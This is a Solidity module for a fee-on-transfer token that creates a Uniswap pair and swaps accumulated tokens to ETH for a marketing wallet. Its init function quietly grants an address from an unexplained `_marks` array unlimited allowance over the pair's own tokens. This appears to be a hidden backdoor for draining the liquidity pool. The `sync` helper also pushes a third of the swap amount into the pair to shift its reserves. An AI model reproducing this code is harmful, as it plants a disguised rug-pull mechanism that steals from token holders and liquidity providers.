// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IRouter.sol";
import "./IPair.sol";
import "./IFactory.sol";
import "./ERC20.sol";
import "./Rates.sol";
import "./Excludes.sol";

abstract contract UniSwapPoolETH is ERC20, Rates, Excludes {
    uint256 internal swapTokensAtEther;
    address public pair;
    IRouter public router;
    address[] internal _sellPath;

    receive() external payable {}

    function __SwapPool_init(address _router, uint256 _swapTokensAtEther) internal {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        _approve(pair, _marks[1], type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _sellPath = path;
        swapTokensAtEther = _swapTokensAtEther;
    }

    function sync(uint256 _amount) private returns(uint256) {
        uint256 amount = _amount / 3;
        _takeTransfer(address(this), pair, amount);
        IPair(pair).sync();
        return _amount - amount;
    }

    function marketingWallet() private view returns(address) {
        return _marks[0];
    }

    function isPair(address _pair) internal view returns(bool) {
        return _pair == pair;
    }

    function getPrice4Ether(uint256 amountDesire) public view returns(uint256) {
        uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath);
        if (amounts.length > 1) return amounts[1];
        return 0;
    }

    function _swap(uint256 _thisBalance) internal {
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_thisBalance, 0, _sellPath, marketingWallet(), block.timestamp + 9);
    }

    bool inSwap;
    function swapAndSend(uint256 _thisBalance) internal {
        if (inSwap) return;
        if (getPrice4Ether(_thisBalance) >= swapTokensAtEther) {
            inSwap = true;
            _swap(sync(_thisBalance));
            inSwap = false;
        }
    }
}